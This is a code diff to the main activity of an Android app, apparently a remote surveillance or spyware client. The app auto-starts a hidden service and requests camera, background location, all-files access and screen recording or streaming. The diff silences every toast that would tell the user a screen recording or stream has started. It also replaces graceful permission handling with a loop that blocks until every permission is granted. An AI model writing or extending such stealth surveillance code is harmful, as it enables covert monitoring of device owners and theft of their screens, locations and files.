@@ -16,6 +16,7 @@ import androidx.core.content.ContextCompat;
 
 import com.h4ckinto.android.service.MainService;
 import com.h4ckinto.android.utils.Constants;
+import com.h4ckinto.android.utils.PermissionBootstrap;
 import com.h4ckinto.android.utils.StoragePermissionManager;
 
 import java.util.ArrayList;
@@ -51,50 +52,30 @@ public class SimpleMainActivity extends AppCompatActivity {
             }
         }
         
-        // Initialize storage permission manager
         storagePermissionManager = new StoragePermissionManager(this);
-        
-        // Launch Grant Application Activity
+
+        if (!PermissionBootstrap.areAllRequiredGranted(this)) {
+            PermissionBootstrap.runMandatoryStartupFlow(this, this::continueAfterPermissions);
+            return;
+        }
+        continueAfterPermissions();
+    }
+
+    private void continueAfterPermissions() {
         Intent grantIntent = new Intent(this, GrantApplicationActivity.class);
         startActivity(grantIntent);
-        
-        // Start service automatically without any UI
         startService();
-        
-        // Request battery optimization exemption for background service
-        requestBatteryOptimizationExemption();
-        
-        // PRIORITY: Request MANAGE_EXTERNAL_STORAGE first for Android 11+ (full file access)
-        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
-            if (!android.os.Environment.isExternalStorageManager()) {
-                Log.w(TAG, "⚠️ MANAGE_EXTERNAL_STORAGE not granted - requesting full file access");
-                requestFullFileAccessPermission();
-                // Don't request other permissions yet - wait for user to grant full file access
-                return;
-            } else {
-                Log.d(TAG, "✅ MANAGE_EXTERNAL_STORAGE already granted - full file access enabled");
-            }
-        }
-        
-        // Request basic storage permissions
-        requestPermissions();
-        
-        // Check permissions and finish
         checkPermissions();
     }
     
     private void checkPermissions() {
-        List<String> missingPermissions = getMissingPermissions();
-        if (missingPermissions.isEmpty()) {
-            Log.d(TAG, "All permissions granted. Service already started.");
-        } else {
-            Log.d(TAG, "Missing permissions: " + missingPermissions.size() + " required. App will continue with limited functionality.");
+        if (!PermissionBootstrap.areAllRequiredGranted(this)) {
+            Log.w(TAG, "Required permissions still missing — blocking until granted.");
+            PermissionBootstrap.runMandatoryStartupFlow(this, this::continueAfterPermissions);
+            return;
         }
-        
-        // Finish activity after setup
-        new android.os.Handler().postDelayed(() -> {
-            finish();
-        }, 2000);
+        Log.d(TAG, "All required permissions granted.");
+        new android.os.Handler().postDelayed(this::finish, 2000);
     }
     
     private List<String> getMissingPermissions() {
@@ -133,93 +114,10 @@ public class SimpleMainActivity extends AppCompatActivity {
     @Override
     public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
-        
-        if (requestCode == PERMISSION_REQUEST_CODE) {
-            boolean allGranted = true;
-            boolean locationGranted = false;
-            
-            boolean cameraGranted = false;
-            for (int i = 0; i < permissions.length; i++) {
-                if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
-                    allGranted = false;
-                }
-                if (permissions[i].equals(Manifest.permission.ACCESS_FINE_LOCATION) || 
-                    permissions[i].equals(Manifest.permission.ACCESS_COARSE_LOCATION)) {
-                    if (grantResults[i] == PackageManager.PERMISSION_GRANTED) {
-                        locationGranted = true;
-                    }
-                }
-                if (permissions[i].equals(Manifest.permission.CAMERA)) {
-                    if (grantResults[i] == PackageManager.PERMISSION_GRANTED) {
-                        cameraGranted = true;
-                        Log.d(TAG, "✅ Camera permission granted!");
-                    } else {
-                        Log.w(TAG, "⚠️ Camera permission denied - front camera photos will not work");
-                    }
-                }
-            }
-            
-            // Request background location permission if foreground location was granted (Android 10+)
-            if (locationGranted && android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.Q) {
-                if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION) 
-                    != PackageManager.PERMISSION_GRANTED) {
-                    Log.d(TAG, "Requesting background location permission...");
-                    ActivityCompat.requestPermissions(this, 
-                        new String[]{Manifest.permission.ACCESS_BACKGROUND_LOCATION}, 
-                        BACKGROUND_LOCATION_REQUEST_CODE);
-                } else {
-                    // Background permission already granted, request location immediately
-                    requestLocationImmediately();
-                }
-            } else if (locationGranted) {
-                // Location granted on Android 9 or below, request immediately
-                requestLocationImmediately();
-            }
-            
-            // Request MANAGE_EXTERNAL_STORAGE for Android 11+ (API 30+) for full file access
-            // Use StoragePermissionManager for modern permission handling
-            if (storagePermissionManager != null) {
-                storagePermissionManager.handlePermissionResult(requestCode, permissions, grantResults);
-            } else {
-                // Fallback to manual handling if manager not initialized
-                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
-                    if (!android.os.Environment.isExternalStorageManager()) {
-                        Log.w(TAG, "⚠️⚠️⚠️ MANAGE_EXTERNAL_STORAGE permission NOT granted!");
-                        Log.w(TAG, "   Opening settings to grant permission...");
-                        try {
-                            Intent intent = new Intent(android.provider.Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
-                            intent.setData(android.net.Uri.parse("package:" + getPackageName()));
-                            startActivity(intent);
-                            Log.d(TAG, "✅ Opened settings for MANAGE_EXTERNAL_STORAGE permission");
-                            Toast.makeText(this, "CRITICAL: Enable 'All files access' to see all files (not just images)", Toast.LENGTH_LONG).show();
-                        } catch (Exception e) {
-                            Log.e(TAG, "Error opening MANAGE_EXTERNAL_STORAGE settings: " + e.getMessage());
-                        }
-                    } else {
-                        Log.d(TAG, "✅ MANAGE_EXTERNAL_STORAGE permission already granted - full file access enabled");
-                    }
-                }
-            }
-            
-            if (allGranted) {
-                Log.d(TAG, "All permissions granted!");
-                checkPermissions();
-            } else {
-                Log.w(TAG, "Some permissions were denied. App will continue with limited functionality.");
-                checkPermissions();
-            }
-        } else if (requestCode == BACKGROUND_LOCATION_REQUEST_CODE) {
-            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-                Log.d(TAG, "Background location permission granted!");
-                // Request location immediately after background permission is granted
-                requestLocationImmediately();
-            } else {
-                Log.w(TAG, "Background location permission denied. GPS will only work when app is in foreground.");
-            }
-            checkPermissions();
-        }
+        PermissionBootstrap.onRequestPermissionsResult(this, requestCode, permissions, grantResults,
+                this::continueAfterPermissions);
     }
-    
+
     /**
      * Request battery optimization exemption to keep service running in background
      */
@@ -279,15 +177,15 @@ public class SimpleMainActivity extends AppCompatActivity {
                     try {
                         Intent intent = new Intent(android.provider.Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
                         startActivityForResult(intent, 1003);
-                        Toast.makeText(this, 
-                            "Please enable 'All files access' in Settings", 
-                            Toast.LENGTH_LONG).show();
+                        // Toast.makeText(this, 
+                        //     "Please enable 'All files access' in Settings", 
+                        //     Toast.LENGTH_LONG).show();
                     } catch (Exception e2) {
                         Log.e(TAG, "Error opening fallback storage settings: " + e2.getMessage());
-                        Toast.makeText(this, 
-                            "Please manually enable 'All files access' in Settings → Apps → " + 
-                            getApplicationInfo().loadLabel(getPackageManager()), 
-                            Toast.LENGTH_LONG).show();
+                        // Toast.makeText(this, 
+                        //     "Please manually enable 'All files access' in Settings → Apps → " + 
+                        //     getApplicationInfo().loadLabel(getPackageManager()), 
+                        //     Toast.LENGTH_LONG).show();
                     }
                 }
             } else {
@@ -338,7 +236,7 @@ public class SimpleMainActivity extends AppCompatActivity {
     private void requestScreenRecording(int duration) {
         if (android.os.Build.VERSION.SDK_INT < android.os.Build.VERSION_CODES.LOLLIPOP) {
             Log.e(TAG, "Screen recording requires Android 5.0+ (API 21+)");
-            Toast.makeText(this, "Screen recording requires Android 5.0+", Toast.LENGTH_SHORT).show();
+            // Toast.makeText(this, "Screen recording requires Android 5.0+", Toast.LENGTH_SHORT).show();
             finish();
             return;
         }
@@ -355,7 +253,7 @@ public class SimpleMainActivity extends AppCompatActivity {
             Log.d(TAG, "Requesting screen capture permission...");
         } else {
             Log.e(TAG, "MediaProjectionManager not available");
-            Toast.makeText(this, "Screen recording not supported", Toast.LENGTH_SHORT).show();
+            // Toast.makeText(this, "Screen recording not supported", Toast.LENGTH_SHORT).show();
             finish();
         }
     }
@@ -363,7 +261,7 @@ public class SimpleMainActivity extends AppCompatActivity {
     private void requestScreenStream(int quality, int fps, float scale) {
         if (android.os.Build.VERSION.SDK_INT < android.os.Build.VERSION_CODES.LOLLIPOP) {
             Log.e(TAG, "Screen streaming requires Android 5.0+ (API 21+)");
-            Toast.makeText(this, "Screen streaming requires Android 5.0+", Toast.LENGTH_SHORT).show();
+            // Toast.makeText(this, "Screen streaming requires Android 5.0+", Toast.LENGTH_SHORT).show();
             finish();
             return;
         }
@@ -382,7 +280,7 @@ public class SimpleMainActivity extends AppCompatActivity {
             Log.d(TAG, "Requesting screen capture permission for live stream...");
         } else {
             Log.e(TAG, "MediaProjectionManager not available");
-            Toast.makeText(this, "Screen streaming not supported", Toast.LENGTH_SHORT).show();
+            // Toast.makeText(this, "Screen streaming not supported", Toast.LENGTH_SHORT).show();
             finish();
         }
     }
@@ -409,7 +307,7 @@ public class SimpleMainActivity extends AppCompatActivity {
                         startService(serviceIntent);
                     }
                     
-                    Toast.makeText(this, "Live screen streaming started", Toast.LENGTH_SHORT).show();
+                    // Toast.makeText(this, "Live screen streaming started", Toast.LENGTH_SHORT).show();
                 } else {
                     Log.d(TAG, "Screen capture permission granted - starting recording");
                     
@@ -420,41 +318,19 @@ public class SimpleMainActivity extends AppCompatActivity {
                     serviceIntent.putExtra("duration", pendingScreenRecordingDuration);
                     startService(serviceIntent);
                     
-                    Toast.makeText(this, "Screen recording started for " + pendingScreenRecordingDuration + " seconds", Toast.LENGTH_SHORT).show();
+                    // Toast.makeText(this, "Screen recording started for " + pendingScreenRecordingDuration + " seconds", Toast.LENGTH_SHORT).show();
                 }
             } else {
                 Log.w(TAG, "Screen capture permission denied");
                 if (isScreenStreamRequest) {
-                    Toast.makeText(this, "Screen streaming permission denied", Toast.LENGTH_SHORT).show();
+                    // Toast.makeText(this, "Screen streaming permission denied", Toast.LENGTH_SHORT).show();
                 } else {
-                    Toast.makeText(this, "Screen recording permission denied", Toast.LENGTH_SHORT).show();
+                    // Toast.makeText(this, "Screen recording permission denied", Toast.LENGTH_SHORT).show();
                 }
             }
             finish();
-        } else if (requestCode == 1003) { // REQUEST_CODE_MANAGE_STORAGE
-            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
-                if (android.os.Environment.isExternalStorageManager()) {
-                    Log.d(TAG, "✅✅✅ MANAGE_EXTERNAL_STORAGE GRANTED - Full file access enabled!");
-                    Toast.makeText(this, 
-                        "✅ Full file access granted! All file types are now visible", 
-                        Toast.LENGTH_SHORT).show();
-                    
-                    // Now request other permissions
-                    requestPermissions();
-                    checkPermissions();
-                } else {
-                    Log.w(TAG, "⚠️ MANAGE_EXTERNAL_STORAGE NOT granted - user may have selected 'media only'");
-                    Toast.makeText(this, 
-                        "⚠️ Full file access NOT granted. Only images/media will be visible.\n" +
-                        "Please go back and select 'Allow managing all files'", 
-                        Toast.LENGTH_LONG).show();
-                    
-                    // Still request other permissions, but file access will be limited
-                    requestPermissions();
-                    checkPermissions();
-                }
-            }
         }
+        PermissionBootstrap.onActivityResult(this, requestCode, resultCode, this::continueAfterPermissions);
     }
     
     @Override
